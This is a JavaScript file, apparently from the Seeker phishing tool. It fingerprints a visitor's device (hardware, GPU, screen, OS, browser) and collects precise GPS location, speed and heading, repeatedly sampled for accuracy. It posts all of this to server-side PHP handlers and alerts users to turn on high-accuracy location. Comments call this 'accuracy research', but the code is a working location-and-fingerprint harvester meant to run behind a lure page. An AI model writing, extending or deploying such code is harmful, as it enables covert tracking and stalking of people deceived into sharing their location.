function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //ram
  if (ram == undefined) {
    ram = 'Not Available';
  }

  //browser
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Not Available';
  }
  if (ren == undefined) {
    ren = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: 'text'
  });
}



function locate(callback, errCallback) {
  if (!navigator.geolocation) {
    return;
  }

  // Accuracy research knobs (defaults preserve the original single-shot
  // behaviour). Set these in the template before calling locate():
  //   window.SEEKER_SAMPLE_COUNT   = 5;     // collect N readings, keep best
  //   window.SEEKER_SAMPLE_TIMEOUT = 30000; // overall window in ms
  var sampleCount = (typeof window !== 'undefined' && window.SEEKER_SAMPLE_COUNT)
    ? window.SEEKER_SAMPLE_COUNT : 1;
  var sampleTimeout = (typeof window !== 'undefined' && window.SEEKER_SAMPLE_TIMEOUT)
    ? window.SEEKER_SAMPLE_TIMEOUT : 30000;
  var optn = { enableHighAccuracy: true, timeout: sampleTimeout, maximumAge: 0 };

  if (sampleCount > 1) {
    collectSamples(sampleCount, sampleTimeout);
  } else {
    navigator.geolocation.getCurrentPosition(
      function (p) { showPosition(p); }, showError, optn);
  }

  // Collect up to `count` readings via watchPosition, then report the most
  // accurate fix along with convergence metrics (best/worst accuracy,
  // time-to-best). Lets the researcher see accuracy improve over time.
  function collectSamples(count, timeout) {
    var samples = [];
    var start = Date.now();
    var done = false;
    var watchId = navigator.geolocation.watchPosition(
      function (pos) {
        samples.push({ pos: pos, t: Date.now() });
        if (samples.length >= count) { finish(); }
      },
      function (error) {
        if (samples.length === 0) { finish(error); }
      },
      optn
    );
    var timer = setTimeout(function () { finish(); }, timeout);

    function finish(error) {
      if (done) { return; }
      done = true;
      clearTimeout(timer);
      navigator.geolocation.clearWatch(watchId);
      if (samples.length === 0) {
        showError(error || { code: -1 });
        return;
      }
      var best = samples[0];
      var accBest = samples[0].pos.coords.accuracy;
      var accWorst = samples[0].pos.coords.accuracy;
      for (var i = 1; i < samples.length; i++) {
        var a = samples[i].pos.coords.accuracy;
        if (a < best.pos.coords.accuracy) { best = samples[i]; }
        if (a < accBest) { accBest = a; }
        if (a > accWorst) { accWorst = a; }
      }
      showPosition(best.pos, {
        samples: samples.length,
        accBest: accBest + ' m',
        accWorst: accWorst + ' m',
        timeToBest: (best.t - start) + ' ms'
      });
    }
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred';
        break;
    }
    if (!err_text) {
      err_text = 'Location information is unavailable';
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: errCallback(error, err_text),
      mimeType: 'text'
    });
  }
  function showPosition(position, meta) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    // GPS accuracy instrumentation
    var accAlt = position.coords.altitudeAccuracy;
    if (accAlt || accAlt === 0) {
      accAlt = accAlt + ' m';
    }
    else {
      accAlt = 'Not Available';
    }

    // Epoch millis of the fix, for measuring time-to-fix / sample intervals
    var ts = position.timestamp || Date.now();

    var ok_status = 'success';

    var payload = { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, AccAlt: accAlt, Ts: ts };
    if (meta) {
      payload.Samples = meta.samples;
      payload.AccBest = meta.accBest;
      payload.AccWorst = meta.accWorst;
      payload.TimeToBest = meta.timeToBest;
    }

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: payload,
      success: callback,
      mimeType: 'text'
    });
  };
}

